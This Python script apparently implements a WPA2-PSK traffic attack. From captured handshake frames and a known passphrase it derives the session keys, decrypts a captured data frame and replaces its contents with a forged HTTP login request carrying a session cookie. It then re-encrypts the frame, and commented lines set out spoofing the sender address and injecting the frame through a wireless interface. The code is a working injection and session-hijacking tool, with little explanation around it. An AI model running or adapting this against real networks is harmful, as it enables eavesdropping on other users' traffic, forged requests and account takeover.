import hashlib
import binascii
import hmac
from typing import Tuple
from Crypto.Cipher import AES # pip install cryptography pycryptodome
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from scapy.all import RadioTap, Dot11QoS, Dot11CCMP, LLC, hexstr, EAPOL, IP, sendp, Raw, Padding


def prf_80211i(K: bytes, A: bytes, B: bytes, Len: int):
    R = b""
    i = 0
    while i <= ((Len + 159) / 160):
        hmac_result = hmac.new(K, A + bytes.fromhex("00") + B + bytes([i]), hashlib.sha1).digest()
        i += 1
        R += hmac_result
    return binascii.hexlify(R).decode()[:128]

def generate_pmk(ssid: str, passphrase: str):
    psk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    psk_hex = binascii.hexlify(psk).decode()
    print("PSK :", psk_hex)
    return psk

def generate_ptk(pmk: bytes, anonce: bytes, snonce: bytes, AP_Addr: bytes, STA_Addr: bytes):
    ptk = prf_80211i(pmk, b"Pairwise key expansion", min(AP_Addr, STA_Addr) + max(AP_Addr, STA_Addr) + min(anonce, snonce) + max(anonce, snonce), 384)
    kck = bytes.fromhex(ptk[:32])
    kek = bytes.fromhex(ptk[32:32+32])
    tk = bytes.fromhex(ptk[64:64+32])
    mic_tx = bytes.fromhex(ptk[96:96+16])
    mic_rx = bytes.fromhex(ptk[112:])
    return ptk, kck, kek, tk, mic_tx, mic_rx

def extract_gtk(kek: bytes, key_wrap_data: bytes):
    decrypt_key_wrap_data = aes_key_unwrap(kek, key_wrap_data)
    decrypt_key_wrap_data = binascii.hexlify(decrypt_key_wrap_data).decode()
    return bytes.fromhex(decrypt_key_wrap_data[60:-4])

def eapol_decoding(packet):
    eapol_message = packet[EAPOL].load
    dot1xAuth = {}
    message_number = {"008a":1, "010a":2, "13ca":3, "030a":4}
    dot1xAuth["key_descriptor_type"] = bytes.hex(eapol_message)[:2]
    dot1xAuth["key_information"] = bytes.hex(eapol_message)[2:2+4]
    dot1xAuth["key_length"] = bytes.hex(eapol_message)[6:6+4]
    dot1xAuth["replay_conter"] = bytes.hex(eapol_message)[10:10+16]
    dot1xAuth["wpa_key_nonce"] = bytes.hex(eapol_message)[26:26+64]
    dot1xAuth["key_iv"] = bytes.hex(eapol_message)[90:90+32]
    dot1xAuth["wpa_key_rsc"] = bytes.hex(eapol_message)[122:122+16]
    dot1xAuth["wpa_key_id"] = bytes.hex(eapol_message)[138:138+16]
    dot1xAuth["wpa_key_mic"] = bytes.hex(eapol_message)[154:154+32]
    dot1xAuth["wpa_key_data_length"] = bytes.hex(eapol_message)[186:186+4]
    dot1xAuth["wpa_key_data"] = bytes.hex(eapol_message)[190:]
    dot1xAuth["message_number"] = message_number.get(dot1xAuth.get("key_information"))
    return dot1xAuth

def get_priority(packet):
    qos_data = packet[Dot11QoS]
    qos_control = hexstr(qos_data).replace(' ', '')[:4]
    qos_control = qos_control[2:] + qos_control[:2]
    tid = int(qos_control[3], 16)
    priority = bin(tid)[2:].zfill(4)[1:]
    priority = int(priority, 2)
    priority = bytes.fromhex(hex(priority)[2:].zfill(2))
    return priority

def parse_ccmp_packet(packet) -> Tuple[bytes, bytes]:
    ccmp_data = packet[Dot11CCMP]
    ccmp_header = hexstr(ccmp_data).replace(' ', '')[:16]
    ccmp_header = [ccmp_header[i:i+2] for i in range(0, len(ccmp_header), 2)]
    ccmp_header.pop(2) # reserved "00" pop
    ext_iv_key_id = bytes.fromhex(ccmp_header.pop(2))
    ext_iv_key_id = bin(ext_iv_key_id[0])[2:].zfill(8)
    key_id = int(ext_iv_key_id[:2], 2)
    ext_iv = ext_iv_key_id[2]
    ccmp_header.reverse()
    ccmp_iv = bytes.fromhex(''.join(ccmp_header))
    encrypted_data = ccmp_data.data
    return ccmp_iv, encrypted_data

def wpa2_decrypt(tk: bytes, priority: bytes, sender_mac: bytes, ccmp_iv: bytes, encrypted_data: bytes):
    ccmp_key = tk
    nonce = priority + sender_mac + ccmp_iv
    cipher = AES.new(ccmp_key, AES.MODE_CCM, nonce, mac_len=8)
    plain_data = cipher.decrypt(encrypted_data)
    return plain_data

def wpa2_encrypt(tk: bytes, priority: bytes, sender_mac: bytes, ccmp_iv: bytes, plain_data: bytes):
    ccmp_key = tk
    nonce = priority + sender_mac + ccmp_iv
    cipher = AES.new(ccmp_key, AES.MODE_CCM, nonce, mac_len=8)
    encrypted_data = cipher.encrypt(plain_data)
    return encrypted_data

def calc_padding(plain_data: bytes):
    block_size = 16
    padding_len = block_size - ((len(plain_data)-10) % block_size)
    if padding_len == 0:
        return b''
    padding = bytes([0] * padding_len)
    return padding

def main():
    ssid = "test_wifi_5G"
    passphrase = "1234567890"
    anonce = b""
    snonce = b""
    ap_mac = b""
    station_mac = b""
    key_wrap_data = b""
    tk = b""
    gtk = b""
    pmk = generate_pmk(ssid, passphrase)

    packet_list = ["00003a006b081c40354cf9a400000000100071164001cea10100888e40010100711695221f08000000000000080000e90010180304003c0e000088024c00d4548b3c1a4a00dffafdffff00dffafdffff00000000aaaa03000000888e0103007502008a001000000000000000019e4fe9e1b2fb972c0a3c0e1f405355ba05c51284b2ba90b7c6ef3e1e986adf420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016dd14000fac0400000000000000000000000000000000a17b6f99",
    "00003a006b081c40d550f9a400000000100071164001d5a10100888e40010100711695221f08000000000000080000b5001018030400ddde000088013c0000dffafdffffd4548b3c1a4a00dffafdffff00000000aaaa03000000888e0103007702010a00000000000000000001672db563afa752a96adddeaf64b5058561f9b90abfacacf69313062987d1f8b800000000000000000000000000000000000000000000000000000000000000000cd2bfc70295bae98da443226ede8b76001830160100000fac040100000fac040100000fac023c000000cd045b6d",
    "00003a006b081c400555f9a400000000100071164001cfa10100888e40010100711695221f08000000000000080000e90010180304003c0e000088024c00d4548b3c1a4a00dffafdffff00dffafdffff10000000aaaa03000000888e010300970213ca001000000000000000029e4fe9e1b2fb972c0a3c0e1f405355ba05c51284b2ba90b7c6ef3e1e986adf429e4fe9e1b2fb972c0a3c0e1f405355baa804000000000000000000000000000054c2b9c82ba417c65e99691783ae78f5003853d62030537dc55716ea2b1e27f8dd7d325bfc062874e2c648576a7c98a25cb53f0de5c958e508274a27320a11ff468d1a757adaf08561d4df0d4982"]

    for packet in packet_list:
        radioTap = RadioTap(bytes.fromhex(packet))
        if radioTap.haslayer(EAPOL) and radioTap[EAPOL].type == 3:  # EAPOL_KEY
            eapol_message = eapol_decoding(radioTap)
            if eapol_message.get("message_number") == 1:
                anonce = bytes.fromhex(eapol_message.get("wpa_key_nonce"))
                ap_mac = bytes.fromhex(radioTap.addr2.replace(":",""))
                station_mac = bytes.fromhex(radioTap.addr1.replace(":",""))
            elif eapol_message.get("message_number") == 2:
                snonce = bytes.fromhex(eapol_message.get("wpa_key_nonce"))
            elif eapol_message.get("message_number") == 3:
                key_wrap_data = bytes.fromhex(eapol_message.get("wpa_key_data"))

    if anonce and snonce and ap_mac and station_mac:
        ptk, kck, kek, tk, mic_tx, mic_rx = generate_ptk(pmk, anonce, snonce, ap_mac, station_mac)
        print("Generated PTK :", bytes.hex(kck), bytes.hex(kek), bytes.hex(tk), bytes.hex(mic_tx), bytes.hex(mic_rx))
        gtk = extract_gtk(kek, key_wrap_data)
        print("GTK :", bytes.hex(gtk))
    else:
        print("Generate PTK failed")


    packet = bytes.fromhex("00003a006b083040c135e5a500000000140d71164001cba101000000e9030000040000f7ff01000082000000013f02000010180304004bd9000088424000d4548b3c1a4a00dffafdffff00dffafdffff800d0000d700002000000000d18db0fbd1529bf73a529a34c69871dade4fc0cb2b2dda299a734bd95d6db5005aba1527584403ee526ead73474a1a712283cf642fb0697b7eef21ad364ee3752d290c6b8a3f7cbf3114cd8af6dcdb594f3fa64bc8cafc1d2047959661a85f95b4d91471069754746ebd5b63c673329ef7426e513cf3cb42f63d49e74944cd6dcee7459c34ecd77848c312b0f2889c592d2e3cf1e8e2e564d9d2309a18bf92ac98343d4bbc9f1d1a559384216842634fb942352d5429af6be01ba033619ba11065c4c86313e878d245dce03bd083d8fa324eee02c53f4c1c54008b15b01678cddfcf58b016c5dfec577ce7f1eefa8200013ab95cadd3faf71b5ea5c765642fedd494941a4da08158803768eafafbf8cdba60f25920d54c1362f495913dce26d81ccae14e4fa0b33bfd2594c67bf5d0e3439266f81c12a0b5a8deb3b2cb5c255dbd6fddbbf57617bf525ccabadb9e6445fdabda41eb4f6d8eea208a7e22d10dc2785c72919bc387304c8d281b5a303bb12bd3d3180d9353396fa485e00854116902c6511bf9d01945c7ed19c1fa82aa38389a73de615c45bf74a3369376eedacb64f8ddf2cf476d58bcd9d0fb5dd714160b204165244f831f639a9711cf55960f785b8f495323bb5c3a767f5ab624849c9a513e46d78293827ef1fb67f8c7f14337e889b8e07b2b2ba094c560e0abf725a0aa17f0840a55eca45d03346e748ccd6a14498ea8b7179ae142ddf8ef6d263bd5eb26d03dc30b250f0abfe28f7c8ef7c9f4ca0b2b8a4ce7bc0bf63a59b8b80d60c29bb0d8654e982939cfb4e2013adff593c2c211aa78aab5740143d96da0824e825ef510d871e60d281d6532ac9c8faff106374df5acce98992f4253ba15c405e3efa1dec95e42244b74b5bf05c7fcc87038e3afd10f1415869c9cdde6bbe2223499800b207e6520d3ea7a22be0aee144263ebd100452a0b18ff51542c648a17c78ed50abe836c920a1b067794d054b2ee3c30b42677c53863c4cc21394d7478a0205ba8a319a9ee181c3f3db5407ce245b2070a4c1644a3b25f666a477b824146539736f7dac462659b80dcca096ffd42dae90a824bd393f9269159f760ee48076195bfd40f77a3a5bdecd47f4988fd6909452215adf9968dad1893039441a85474b0b5d2c040abe6607554918ad8e2140f946ded9767a41caca22c615fe7198056d719e9673d3512c7fbb26438a5dfa8ae0aed86cc99ee6094b19c6d8dff1bd6daa1e73da0b39971342f4312be44a1716bc1edac7f8d3d6e3445c73f617d0e77df748d2919e23e5f65250d76ef7e37dd0696c2a9df0bd50256556a3c1415b795f6d5412860a2e9e3ef6a3dcfde793f172e50a6f9c49c427ca0281b61df2c97f7cbe9cace486e367f763ef18e0ce9a2d351358a326a8289d14cb1d71cef2c94730265f16cd751a8a2d5d6aa60ff40113d3c178342f25827df200cfc42735ab0224c82b59eba57d6aed5fe54a9451cc58ef0b6f00ccf89b342008e98a5e712912ac986b97542d5195283195c547ef576f6b531b59094397779de85d74ff6c7c8d56477c44ae39bb52bb660ce3e5cfc8c1a6192537102d685c914107ef219123a6c0620a721486feee2ad8d00cee050161cd314eba98ec3a3912484c382dd462c6868e55ce9554305dce361ab5ae2ffda4f52ba47abb22ec403b4106587351249c84ce31ac5abcbcfe626f8e0f9cb524aa5bb32f38db9b0070f5777fce0da8476fcd4c2e061fefa1006fa390689e71db081288f16d591c661940813bd8dcd584a440d21c9a34424fcd2eaeee040becd5bc9453748cabacf30164b49584ac19323532ce978d212409176d8585c8aba837bae9296d9f0e1edbf57fb46f4de6b2e90900110e81d8043d180d0a10b18c04e9f76910f72391474453a459a93f2f93c038e94b815195ed65ff44e83dbe531caadf214809dca2e1893255cf9d9f6bb9df5e6c4dc295af7672f309f6ccea73dc0347c083387b06d9c56c4ca7e34c785534ec4af4fbe46d29a822a361873e2127d1a15829bb1e4b9285a6e3c0fdacd9d18e23a52aa8c9df7f24dcdc06735561d9952622877e4f27952a77154384046efdca3d60710fecef2ee37b5be053d0aacca9dc3148acc40f3e99b71ad34357f81d4")
    radioTap = RadioTap(packet)

    if Dot11QoS in radioTap:
        priority = get_priority(radioTap)
    else:
        priority = bytes.fromhex("00")

    if Dot11CCMP in radioTap:
        ccmp_iv, encrypted_data = parse_ccmp_packet(radioTap)

    sender_mac = bytes.fromhex(radioTap.addr2.replace(":",""))
    if tk and priority and sender_mac and ccmp_iv and encrypted_data:
        plain_data = wpa2_decrypt(tk, priority, sender_mac, ccmp_iv, encrypted_data)
    else:
        print("decrypt failed")
        return
    LLC_frame = LLC(plain_data)
    LLC_frame.show()

    tampered_request = """GET /login.php HTTP/1.1
Host: cobla.io
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cobla.io/article.php?no=3199
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=a8pa4vfohiclm8tbc6mc4lidui

"""

    tampered_request = tampered_request.replace("\n","\r\n")
    LLC_frame[Raw].load = tampered_request.encode()
    # LLC_frame[IP].src = "192.168.0.4" // 변조 가능
    # LLC_frame[IP].dst = "43.201.25.161" // 변조 가능
    if Padding in LLC_frame:
        del LLC_frame[Padding]
        LLC_frame[IP].len = len(bytes((LLC_frame[2])))
        padding = calc_padding(bytes(LLC_frame))
        LLC_frame = LLC_frame / Padding(padding)
    else:
        LLC_frame[IP].len = len(bytes((LLC_frame[2])))
    tampered_llc = wpa2_encrypt(tk, priority, station_mac, ccmp_iv, bytes(LLC_frame))
    # LLC_frame.show()

    radioTap[Dot11CCMP].data = tampered_llc
    # radioTap.addr2 = "98:48:27:88:1e:9d" // wifi adapter mac
    # radioTap.show()
    # sendp(radioTap, iface="wlan0") // 2 계층 패킷 전송

if __name__ == '__main__':
    main()
